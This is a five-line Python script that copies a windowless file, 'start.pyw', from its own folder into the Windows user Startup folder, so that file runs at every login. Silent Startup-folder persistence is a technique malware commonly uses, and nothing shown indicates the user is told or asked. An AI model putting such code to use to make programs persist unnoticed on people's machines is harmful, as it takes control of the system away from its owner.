import os
import shutil
dir = os.path.dirname(os.path.realpath(__file__)) + "\\start.pyw"
copyto = os.getenv("appdata") + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
shutil.copy(dir, copyto)